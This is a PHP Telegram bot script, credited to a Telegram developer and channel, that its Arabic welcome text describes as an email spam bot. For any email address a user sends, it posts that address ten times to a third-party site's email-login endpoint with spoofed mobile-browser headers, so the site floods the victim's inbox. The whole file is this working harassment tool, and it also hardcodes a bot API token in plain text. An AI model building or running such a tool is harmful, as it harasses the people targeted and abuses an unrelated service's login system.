<?php
header('Content-Type: application/json; charset=utf-8');
/*------------- by @BlIJJ ---------------
المطور : @BlIJJ
قناتنا : @M_M_D74

لا تنسونا بصالح الدعاء ❤️
-------------- by @BlIJJ  --------------*/
$token="7727388455:AAFze8eR4buCw6w5_pDpNC892Siz-owrQow";
define('API_KEY',$token);
function bot($method,$datas=[]){
    $url = "https://api.telegram.org/bot".API_KEY."/".$method;
$ch = curl_init();
    curl_setopt($ch,CURLOPT_URL,$url);
    curl_setopt($ch,CURLOPT_RETURNTRANSFER,true);
    curl_setopt($ch,CURLOPT_POSTFIELDS,$datas);
    $res = curl_exec($ch);
    if(curl_error($ch)){
        var_dump(curl_error($ch));
    }else{
        return json_decode($res);
    }
}
file_get_contents("https://api.telegram.org/bot".API_KEY."/setwebhook?url=".$_SERVER['SERVER_NAME']."".$_SERVER['SCRIPT_NAME']);
$houda = json_decode(file_get_contents("houda.json"),true);
$update = json_decode(file_get_contents('php://input'));
if(isset($update->message)){
$message = $update->message;
$message_id = $update->message->message_id;
$chat_id = $message->chat->id;
$text = $message->text;
$user = $message->from->username;
$name = $message->from->first_name;
$name1 = $message->from->last_name;
$from_id = $message->from->id;
$tc = $message->chat->type;
}
if(isset($update->callback_query)){
$data = $update->callback_query->data;
$chat_id = $update->callback_query->message->chat->id;
$message_id = $update->callback_query->message->message_id;
$name = $update->callback_query->message->chat->first_name;
$user = $update->callback_query->message->chat->username;
$from_id = $chat_id;
$tc = $update->callback_query->message->chat->type;
}
if($text=='/start'){
bot("sendmessage",[
"chat_id"=>$chat_id,
"text"=>"*مرحبا بك في بوت اسبام للبريد
يرجي ارسال البريد لارسل له 10 رسائل 
*","parse_mode"=>"markdown",
'reply_markup'=>json_encode([
    'inline_keyboard'=>[
 [['text'=>"• ᴍʏ ᴘʀᴏғɪʟᴇ •", 'url'=>'t.me/BlIJJ']],
 [['text'=>"• ᴍʏ ᴄʜᴀɴɴᴇʟ •", 'url'=>'t.me/M_M_D74']],
]
])
]);
}else{
if(preg_match('/(.*?)@(.*?)/',$text)){
bot("sendmessage",[
"chat_id"=>$chat_id,
"text"=>"*جاري الارسال*",
"parse_mode"=>"markdown",]);
for($i=1;$i<=10;$i++){
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://kidzapp.com/emailLogin?action=0');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, "email=$text");
curl_setopt($ch, CURLOPT_ENCODING, 'gzip, deflate');
$headers = array();
$headers[] = 'Authority: kidzapp.com';
$headers[] = 'Accept: */*';
$headers[] = 'Accept-Language: ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7';
$headers[] = 'Content-Type: application/x-www-form-urlencoded; charset=UTF-8';
$headers[] = 'User-Agent: Mozilla/5.0 (Linux; Android 12; M2004J19C) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36';
$headers[] = 'X-Requested-With: XMLHttpRequest';
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
$result = curl_exec($ch);
curl_close($ch);
sleep(0.5);
bot("editmessageText",[
"chat_id"=>$chat_id,
'message_id'=>$message_id +1,
"text"=>"*تم ارسال $i*",
"parse_mode"=>"markdown",]);
}}else{
bot("sendmessage",[
"chat_id"=>$chat_id,
"text"=>"*ارسل بريد صحيح*
.","parse_mode"=>"markdown",]);
}
}
/*------------- by @BlIJJ ---------------
المطور : @BlIJJ
قناتنا : @M_M_D74

لا تنسونا بصالح الدعاء ❤️
-------------- by @BlIJJ  --------------*/
